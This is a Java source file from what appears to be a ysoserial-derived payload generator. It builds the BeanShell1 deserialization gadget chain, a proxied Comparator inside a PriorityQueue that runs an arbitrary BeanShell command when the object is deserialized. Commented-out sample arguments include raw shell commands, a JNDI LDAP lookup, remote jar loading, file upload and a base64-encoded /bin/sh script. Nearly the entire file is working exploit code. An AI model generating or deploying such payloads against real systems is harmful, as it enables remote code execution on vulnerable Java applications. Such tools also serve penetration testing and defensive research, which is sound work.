package me.gv7.woodpecker.yso.payloads;

import bsh.Interpreter;
import bsh.NameSpace;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.custom.BeanShellUtil;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
        // BeanShell payload
        String payload = BeanShellUtil.getPayload(command);

        // Create Interpreter
        Interpreter i = new Interpreter();
        /***** 覆盖bsh.cwd,清空user.dir，防止信息泄露 *****/
        Method setu = i.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
    	setu.setAccessible(true);
    	setu.invoke(i,new Object[]{"bsh.cwd","."});
    	/*************************/

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        Class clsXThis = Class.forName("bsh.XThis");
        Constructor cXThis = clsXThis.getDeclaredConstructor(new Class[]{NameSpace.class,Interpreter.class});
        cXThis.setAccessible(true);
        Object xt = cXThis.newInstance(new Object[]{i.getNameSpace(),i});
        //XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }

    public static void main(String[] args) throws Exception {
        //args = new String[]{"raw_cmd:open /System/Applications/Calculator.app"};
        //args = new String[]{"sleep:10"};
        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        //args = new String[]{"loadjar:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc"};
        //args = new String[]{"loadjar_with_args:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc|open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
        //args = new String[]{"upload_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js|/tmp/JavaScriptTest2.js"};
        //args = new String[]{"script_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js"};
        //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
        //args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
        PayloadRunner.run(BeanShell1.class, args);
//        String command = "raw_cmd:id";
//        Object cc6 = new BeanShell1().getObject(command);
//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("beanshell.1.3.0.ser"));
//        oos.writeObject(cc6);
//        oos.flush();

//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("beanshell.1.3.0.ser"));
//        objectInputStream.readObject();
    }
}
